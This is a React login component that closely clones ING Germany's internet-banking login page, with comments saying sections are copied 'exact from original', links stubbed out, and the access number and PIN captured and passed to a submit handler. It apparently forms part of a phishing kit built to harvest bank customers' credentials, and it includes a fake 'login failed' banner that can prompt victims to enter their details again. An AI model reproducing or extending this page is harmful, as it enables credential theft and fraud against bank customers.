import React, { useState } from 'react';

interface LoginFormProps {
  onSubmit: (data: { username: string; password: string }) => void;
  showError?: boolean;
}

const LoginForm: React.FC<LoginFormProps> = ({ onSubmit, showError = false }) => {
  const [formData, setFormData] = useState({
    username: '',
    password: ''
  });
  const [showPassword, setShowPassword] = useState(false);
  const [errors, setErrors] = useState({
    username: '',
    password: ''
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
    
    // Clear error when user types
    if (errors[name as keyof typeof errors]) {
      setErrors(prev => ({ ...prev, [name]: '' }));
    }
  };

  const validateForm = () => {
    let valid = true;
    const newErrors = { username: '', password: '' };
    
    if (!formData.username.trim()) {
      newErrors.username = 'Bitte geben Sie Ihre Zugangsnummer oder Ihren Benutzernamen ein.';
      valid = false;
    }
    
    if (!formData.password.trim()) {
      newErrors.password = 'Bitte geben Sie Ihre PIN oder Ihr Passwort ein.';
      valid = false;
    } else if (formData.password.length < 5) {
      newErrors.password = 'Ihre PIN oder Ihr Passwort muss mindestens 5 Zeichen lang sein.';
      valid = false;
    }
    
    setErrors(newErrors);
    return valid;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    console.log('ING Form submitted');
    
    if (validateForm()) {
      console.log('ING Form validated, submitting:', formData);
      if (formData.username && formData.password) {
        onSubmit(formData);
      }
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(prev => !prev);
  };

  return (
    <>
      {/* Info Box at Top - EXACT FROM ORIGINAL */}
      <div className="ing-card info-box-card">
        <div className="info-box">
          <div className="info-box__icon">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
            </svg>
          </div>
          <div className="info-box__content">
            <p style={{ fontWeight: 400 }}><span style={{ fontWeight: 500 }}>Wir haben unseren Log-in angepasst</span></p>
            <p>
              Haben Sie sich schon einen Benutzernamen vergeben? Dann müssen Sie diesen zusammen mit Ihrem selbst gewählten Passwort für Ihren Log-in nutzen.
            </p>
            <p>
              Sie haben sich noch keinen Benutzernamen vergeben? Keine Sorge: Sie können sich weiter wie gewohnt mit Zugangsnummer und Internetbanking PIN einloggen.
            </p>
            <p>Mehr erfahren Sie unter <a href="#" className="link">ing.de/login-neu</a>.</p>
          </div>
        </div>
      </div>

      {/* Two Column Layout - EXACT FROM ORIGINAL */}
      <div className="two-column-layout">
        <div className="ing-card left-column">
          <div className="card-title">Anmelden mit Zugangsdaten</div>
          <div className="form-container">
            <form onSubmit={handleSubmit} className="form-container_content">
              {showError && (
                <div className="form-error-banner" style={{
                  backgroundColor: '#fff0f0',
                  border: '1px solid #ff0000',
                  borderRadius: '4px',
                  padding: '16px',
                  marginBottom: '20px'
                }}>
                  <p style={{ color: '#ff0000', margin: 0 }}>
                    <strong>Anmeldung fehlgeschlagen.</strong> Bitte überprüfen Sie Ihre Zugangsdaten.
                  </p>
                </div>
              )}
              
              <div className="form-group">
                <div className="form-row">
                  <label className="form-group__label" htmlFor="username">
                    Zugangsnummer oder<br />Benutzername
                  </label>
                  <div className="form-group__input-container">
                    <input
                      className={`input-field ${errors.username ? 'error' : ''}`}
                      type="text"
                      id="username"
                      name="username"
                      value={formData.username}
                      onChange={handleChange}
                      autoComplete="off"
                      autoCorrect="off"
                      maxLength={20}
                    />
                    <small className="form-group__hint">
                      Letzte 10 Stellen Ihrer ING IBAN / Depotnummer<br />oder selbst vergebener Benutzername.
                    </small>
                    {errors.username && (
                      <span className="form-group__error">{errors.username}</span>
                    )}
                  </div>
                </div>
              </div>
              
              <div className="form-group">
                <div className="form-row">
                  <label className="form-group__label" htmlFor="password">
                    Internetbanking PIN<br />oder Passwort
                  </label>
                  <div className="form-group__input-container">
                    <div className="password-field-wrapper">
                      <input
                        className={`input-field ${errors.password ? 'error' : ''}`}
                        type={showPassword ? 'text' : 'password'}
                        id="password"
                        name="password"
                        value={formData.password}
                        onChange={handleChange}
                        autoComplete="off"
                        minLength={5}
                        maxLength={64}
                      />
                      <button
                        type="button"
                        className="password-toggle"
                        onClick={togglePasswordVisibility}
                        aria-label={showPassword ? 'Passwort verbergen' : 'Passwort einblenden'}
                        title={showPassword ? 'Passwort verbergen' : 'Passwort einblenden'}
                      >
                        {showPassword ? (
                          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                          </svg>
                        ) : (
                          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
                          </svg>
                        )}
                      </button>
                    </div>
                    <small className="form-group__hint">
                      5- bis 10-stellige Internetbanking PIN oder<br />Passwort, das Sie selbst vergeben haben.
                    </small>
                    {errors.password && (
                      <span className="form-group__error">{errors.password}</span>
                    )}
                  </div>
                </div>
              </div>
              
              <div className="form-group anmelden-button-container">
                <button type="submit" className="button button-primary">
                  Anmelden
                </button>
              </div>
              
              <div className="form-group links-container">
                <a href="#" className="link forgotten-link">Zugangsdaten vergessen?</a>
                
                <div className="new-user">
                  <p>Neu bei uns?</p>
                  <a href="#" className="link create-link">Jetzt Zugangsdaten erstellen</a>
                </div>
              </div>
            </form>
          </div>
        </div>
        
        {/* Right Column - QR Login - EXACT FROM ORIGINAL */}
        <div className="ing-card right-column">
          <div className="qr-heading">
            <img src="/templates/ingdiba/images/qr1.svg" alt="QR Code" className="qr-icon" />
            <div className="card-title qr-title">Anmelden mit App und QR-Code</div>
          </div>
          <div className="form-container">
            <div className="qr-login">
              <div className="qr-login__content">
                <p>Sie nutzen bereits die ING App? Dann können Sie sich jetzt in <span className="highlight">Ihrem Internetbanking</span> ganz einfach <strong>ohne Zugangsdaten</strong> anmelden.</p>
                <p>
                  <a href="#" className="link qr-link">So funktioniert der QR Log-in</a>
                </p>
                <p>
                  <a href="#" className="link qr-link">QR Log-in Video-Anleitung</a>
                </p>
                <div className="form-group">
                  <button type="button" className="button button-primary button-block">
                    Anmelden mit QR Log-in
                  </button>
                </div>
                <div className="checkbox-container">
                  <input type="checkbox" id="remember-qr" />
                  <label htmlFor="remember-qr">
                    Auf diesem Gerät und mit diesem Browser immer mit QR Log-in anmelden.
                  </label>
                </div>
              </div>
              <div className="qr-login__image">
                <img src="/templates/ingdiba/images/2806105F0D1ABC5821C.png" alt="ING App QR Login" className="phone-image" />
              </div>
            </div>
          </div>
        </div>
      </div>
      
      {/* Bottom Messages Card - EXACT FROM ORIGINAL */}
      <div className="ing-card message-card">
        <div className="form-container">
          <h3 className="current-messages__title">Aktuelle Mitteilungen</h3>
          <div className="message-list">
            <div className="message-item">
              <div className="message-item__icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="6 9 12 15 18 9"></polyline>
                </svg>
              </div>
              <div className="message-item__content">
                <div className="message-item__title">Vorsicht vor gefälschten ING Webseiten</div>
              </div>
            </div>
            <div className="message-item">
              <div className="message-item__icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="6 9 12 15 18 9"></polyline>
                </svg>
              </div>
              <div className="message-item__content">
                <div className="message-item__title">Achtung: Betrüger wollen an Ihre Daten!</div>
              </div>
            </div>
            <div className="message-item">
              <div className="message-item__icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="6 9 12 15 18 9"></polyline>
                </svg>
              </div>
              <div className="message-item__content">
                <div className="message-item__title">Info-Banner - neue Produktbedingungen</div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default LoginForm;